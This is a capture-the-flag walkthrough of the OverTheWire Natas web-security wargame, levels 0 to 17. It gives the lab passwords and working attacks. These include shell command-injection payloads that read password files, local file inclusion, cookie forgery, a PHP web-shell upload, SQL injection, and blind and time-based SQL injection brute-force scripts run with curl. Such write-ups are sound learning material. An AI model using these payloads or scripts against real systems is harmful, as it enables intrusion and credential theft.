### [natas0](http://natas0.natas.labs.overthewire.org/)

natas0:natas0

The password for natas1 is located in a comment on the webpage:

```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto-->
```

===

### [natas1](http://natas1.natas.labs.overthewire.org/)

natas1:gtVrDuiDfck831PqWsLEZy5gyDz1clto

So this page apparently disables right-clicking, but I already had Firefox's element inspector open, so I didn't need to right-click anyway.

```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi-->
```

If I hadn't been lucky enough to come into the page with the inspector open, I could also hit `F12` to open it, open the page's source with C-u, or disable JavaScript and then right-click away!

===

### [natas2](http://natas2.natas.labs.overthewire.org/)

natas2:ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi

Examining the source of the page we see a 1x1 image located at `files/pixel.png`. I looked into the file to see if the password was hidden inside it. The file didn't have anything inside, but it did alert us to the existence of the `files/` directory, we navigate to that directory to find `files/users.txt`

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

So there's our password.

### [natas3](http://natas3.natas.labs.overthewire.org/)

natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14

Bit of a cheeky comment in the page's source this time:

```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```

While I'm sure I could google `"natas3 solution"` to find that elusive password, I realized after a bit of thinking that this comment was hinting towards the site's `robots.txt`, a file that contains rules for web-crawlers

```
User-agent: *
Disallow: /s3cr3t/
```

in `s3cr3t/` we find `users.txt`, which contains our login information

```

### [natas4](http://natas4.natas.labs.overthewire.org/)

natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ

Okay, so here we'll need to spoof the referrer header to get the info we need, let's just use `curl`.

```console
curl -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ natas4.natas.labs.overthewire.org --referer "http://natas5.natas.labs.overthewire.org/"
...
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

### [natas5](http://natas5.natas.labs.overthewire.org/)

natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq

So when trying to connect we are told that we are not logged in, as logging in is usually handled by cookies, let's take a look at the cookies to see what we can find.

In Firefox you can use `shift + F9` to open the storage pane, if you click on the natas5 entry underneath "Cookies", we can see that there is a cookie called `loggedin` set to 0. We set the value of that cookie to 1, refresh, and are given the password.

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

===

### [natas6](http://natas6.natas.labs.overthewire.org/)

natas6:aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1

This one is pretty straightforward, we see in the source code in the link provided that our input is checked against the variable `$secret` included from `includes/secret.inc`. Here's the content of `http://natas6.natas.labs.overthewire.org/includes/secret.inc`

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

We input the sting `FOEIUWGHFEEUHOFUOIU` into the field, submit, and get our password

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

===

### [natas7](http://natas7.natas.labs.overthewire.org/)

natas7:7z3hEENjQtflzgnT29q7wAvMNfZdh0i9

A useful hint appears in the source of this one

```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

So clearly we're going to be poking our way into the server a bit, let's abuse the `index.php?page=X` layout this page is using. Let's just try `natas7.natas.labs.overthewire.org/index.php?page=` to start

```
Warning: include(): Filename cannot be empty in /var/www/natas/natas7/index.php on line 21

Warning: include(): Failed opening '' for inclusion (include_path='.:/usr/share/php:/usr/share/pear') in /var/www/natas/natas7/index.php on line 21
```

Okay so it looks like this page just tries to grab whatever file is after the `=` in the url, I bet they aren't going to account for us poking into the root directory `natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

```

```

===

### [natas8](http://natas8.natas.labs.overthewire.org/)

natas8:DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

Looking at the provided sourcecode, we just have to reverse this whole operation

```JavaScript
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
```

This should do it:

```PHP
base64_decode(strrev(hex2bin($encodedSecret)))
```

Of course, we can't actually access those functions, if they exists, so I'll just do it in a shell

```console
maket@anderson ~/p/o/natas> echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
oubWYf2kBq
```

We put this string into the field and get back our password

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

### [natas9](http://natas9.natas.labs.overthewire.org/)

natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl

Looking at the source code, here's the exploitable part (note `$key` is the value of the input field)

```PHP
passthru("grep -i $key dictionary.txt");
```

Here's what we'll input to inject our command into the server and get the password

```
;cat /etc/natas_webpass/natas10;
# this makes the grep command
grep -i ;cat/etc/natas_webpass/natas10; dictionary.txt
```

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

===

### [natas10](http://natas10.natas.labs.overthewire.org/)

natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu

The program now filters out `;`, `|`, and `&`, so we as easily run our own commands. Let's just mess with the `grep` command itself, we'll input

```
-r . /etc/natas_webpass
# which makes the grep command
grep -i -r . /etc/natas_webpass dictionary.txt
```
the output is large, but the password we need is there

```
/etc/natas_webpass/natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
...
```

===

### [natas11](http://natas11.natas.labs.overthewire.org/)

natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK

We'll be reverse engineering the key used to XOR encrypt the cookie that stores the `showpassword` and `bgcolor` variables, then we'll use that key to encrypt data with `showpassword="yes"`, which will make the page give us the password.

```PHP
<?php

$encrypted_cookie = base64_decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=");
$decrypted_cookie = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));  
$key = '';
for($i=0;$i<strlen($decrypted_cookie);$i++) {  
    $key .= $encrypted_cookie[$i] ^ $decrypted_cookie[$i % strlen($decrypted_cookie)];  
}  

$custom_cookie = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$cc_out = '';
for($i=0;$i<strlen($custom_cookie);$i++) {  
    $cc_out .= $custom_cookie[$i] ^ $key[$i % strlen($custom_cookie)];  
}  

print(base64_encode($cc_out));

?>  
```

```console
maket@anderson ~/p/o/natas> php -f natas11.php
ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

Now we replace the existing cookie with our forged one to get our password

```
The password for natas12 is
EDXp0pS26wLKHZy1rDBPUZk0RKfLGI3R
```

### [natas12](http://natas12.natas.labs.overthewire.org/)

natas12:EDXp0pS26wLKHZy1rDBPUZk0RKfLGI3R

This problem is finding an exploit on an image uploading service.

We see that the servercode never actually checks that the file we're uploading is a jpeg, it merely makes a random file with a .jpg extension, or in reality, it makes a random filename with the same extension as the temporary filename generated in the HTML.

```HTML
<input type="hidden" name="filename" value="<? print genRandomString(); ?>.jpg" />
```

This filename is generated when the user loads the page, but it can be edited before we submit our file, meaning we can change the extension on the value attribute of that input tag, and when the file is uploaded it will have a `.php` extension. This will make the server treat the file like a `PHP` document, meaning we can excecute whatever code we want on this thing.

```HTML
<html><body><?php

print(passthru("cat /etc/natas_webpass/natas13"));

?></body></html>
```

We upload that file, change the tag to `whatever.php`, upload our file, and are given a link that gives us the next password.

### [natas13](http://natas13.natas.labs.overthewire.org/)

natas13:jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY

Natas level 13 is much like the previous level, the only addition is in a check using php's `exif_imagetype` function. This function merely checks the header of the file to see if it contains the a magic number that an image filetype would contain.
By appending the jpeg header `ff d8 ff e0` to our code, we should be able to bypass this check.

We do this, and recieve our password.

```

```

### [natas14](http://natas14.natas.labs.overthewire.org/)

natas14:Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1

Natas level 14 is just some simple SQL injection, I'm sure more is soon to follow though

We input `natas15` as our username and `" or ""="` as our password. This results in the query made being

```SQL
SELECT * from users where username=natas15 and password= "" or ""=""
```

The password condition will always be true, so we are returned natas15's password

```

```

### [natas15](http://natas15.natas.labs.overthewire.org/)

natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J

Here we don't get the result of your SLQ queries, we only recieve wether or not our query returned any results. We can abuse this information to figure out the password.

Let's just make sure our user is `natas16`, we input `natas16` and are told `This user exists`.

now we're going to inject further conditions into our query, we'll basically be guessing the password one letter at a time by abusing the `like binary` sql keyword and the `%` wildcard. The following script does this with `curl`.

```bash
#!/usr/bin/env bash

# run until the same password appears twice

password='';
echo "starting brute_force attack";

while true; do
for f in {a..z} {A..Z} {0..9}; do
    curl -s -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J 'http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16"%20and%20password%20like%20binary%20%22'$password$f'%' | grep exists
    if [ $? -eq 0 ]
    then
       password=$password$f;
       break
    fi
done
echo $password;
done
```

Once the script spits out the same password twice, we know we have the complete password.

```

### [natas16](http://natas16.natas.labs.overthewire.org/)

natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh

We're back to the poorly secured `grep`s, this one now puts our key in quotes and filters for quotes and apostrophes before calling grep on it.

We'll use a similar approach to the previous issue, we can inject a `grep` on the password file, we can't view the output of this grep, but if the grep succeeds then the grep on the dictionary will not return any results.

So we append a word we know to be in our shell injection to the start of our query, then test grepping the password file until we don't get any results.

here's a script that automates it in the same manner as the previous level

```bash
#!/usr/bin/env bash

# run until the same password appears twice

password='';
echo "starting brute_force attack";

while true; do
for f in {a..z} {A..Z} {0..9}; do
    curl -s -u natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh 'http://natas16.natas.labs.overthewire.org/?needle=test%24(grep+^'$password$f'+%2Fetc%2Fnatas_webpass%2Fnatas17)&submit=Search' | grep smartest > /dev/null
    if [ $? -ne 0 ]
    then
       password=$password$f;
       break
    fi
done
echo $password;
done
```

Running this we eventually get our password

```

```

### [natas17](http://natas17.natas.labs.overthewire.org/)

natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw

The serverside code for level 17 is the exact same as level 15, but the echo statements that tell us if your query has succeeded have been commented out. So if we want to take the same style of approach to the problem we'll need to find a different way to determine if our queries have passed.

We'll add a `and sleep(2)` to the end of our query, this will only run in the case that the `like binary` statement checking the password passes, so if we guess the right letter the query will take two seconds longer to respond, which we can track. Here's the new script

```bash
#!/usr/bin/env bash

# run until the same password appears twice

password='';
echo "starting brute force attack";

while true; do
    for f in {a..z} {A..Z} {0..9}; do
	reqtime=$(curl -o /dev/null -s -w '%{time_total}\n' -u natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw 'http://natas17.natas.labs.overthewire.org/index.php?debug&username=natas18%22%20and%20password%20like%20binary%20%27'$password$f'%25%27%20and%20sleep%282%29+%23')
	if [[ $reqtime > 2 ]]
	then
	    password=$password$f
	    break
	fi
    done
    echo $password;
done
```

We run this and slowly are given our password
